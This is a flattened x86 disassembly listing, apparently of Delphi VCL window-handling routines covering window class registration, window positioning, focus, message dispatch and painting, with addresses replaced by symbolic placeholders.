xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_448138
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_448138
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax edi
call sub_44daa8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_448138
mov eax edi
call sub_44ae60
jmp r-xdata
mov edx ebx
mov eax edi
call sub_449f70
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44a3e4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_448138
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax esi
call sub_44daa8
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_44a25c
mov eax ebp
call sub_44acc4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44a2c8
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_448138
mov eax esi
call sub_44a02c
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_4473cc
sub_44a460
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_41b654
mov edx edi
mov eax ebp
call sub_41b654
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44a4bc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_44a49c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_44a460
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_44a4fc
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_44a4bc
add esp 0x10
retn
sub_44a524
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_44a590
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4475c8
test al al
je r-xdata
mov eax ebx
call sub_4475f8
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_40358c
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_40358c
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_40358c
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_44a5f8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_44a716
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402da4
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44a590
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_44d7a4
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4032e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404384
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408ca8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a71d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_44a724
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44a8e5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_443d78
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_443d78
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc80
call sub_403b5c
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40d244
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40d244
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408e48
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_44dab4
push 0x1
mov eax [ esi + 0x68 ]
call sub_426e50
mov ecx eax
mov edx 0x30
mov eax esi
call sub_448138
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_44d7a4
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44a8ec
lea eax [ ebp - 0xc0 ]
call sub_404120
retn
mov eax esi
mov si 0xffee
call sub_40358c
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_44a8f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406f28
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_44a934
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41fde4
mov eax esi
call sub_41fd34
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41fd34
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41fdec
pop esi
pop ebx
retn
sub_44a96c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_421ff0
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_421f24
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_421f24
mov eax esi
call sub_421ff8
add esp 0x10
pop esi
pop ebx
retn
sub_44a9d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_44a9c0
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_41b654
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41b654
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_44aaac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_448470
mov eax [ ebp - 0x8 ]
push eax
push sub_44a934
mov eax [ ebp - 0x8 ]
push eax
push sub_44a96c
push ebp
call sub_44a9d4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44ab08
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_446ef8
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408dfc
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408e10
mov ecx eax
mov edx edi
mov eax ebx
call sub_446f08
mov eax r-xdata
call sub_408e1c
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_4459ac
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_44ab60
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_44abad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44abb4
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40d244
sub_44abc4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_41b6b0
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_41b654
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_44ac0c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_44a49c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_44abc4
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_44a460
call sub_4465d8
inc edi
dec esi
jne r-xdata
sub_44aca8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_44acc4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_41b654
call sub_44acc4
inc edi
dec esi
jne r-xdata
sub_44ad24
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_40358c
mov ebx eax
mov eax edi
call sub_44acc4
mov eax edi
call sub_44ae60
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_44ad64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_44ae3a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_448138
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_41b654
call sub_44ad64
inc esi
dec ebx
jne r-xdata
sub_44ae60
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44ad64
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_44aea0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_44acc4
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_44ae60
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406f18
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_448138
jmp r-xdata
sub_44af28
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44af80
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_44af6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44af76
call sub_4459ac
call sub_42b2b0
retn
sub_44afa0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_419ff0
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406f00
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_448138
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_44b058
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_41b654
call sub_44afa0
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_41b654
call sub_44afa0
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_44b0ec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d7a4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406eec
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44b058
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406f00
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_448138
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_44b180
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_4476f4
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_448204
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44b0ec
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406eec
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_446ac8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44b058
test eax eax
je r-xdata
mov eax ebx
call sub_45dd9c
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_448204
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_44daa8
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_44d7a4
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_448138
sub_44b2e4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_448398
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_448138
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_42697c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_427600
call sub_42697c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_42763c
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_446b24
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_44b3ec
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_443e64
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_448138
mov [ esi + 0xc ] eax
mov bl 0x1
sub_44b420
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_44b540
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44d7a4
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44b578
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44b547
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
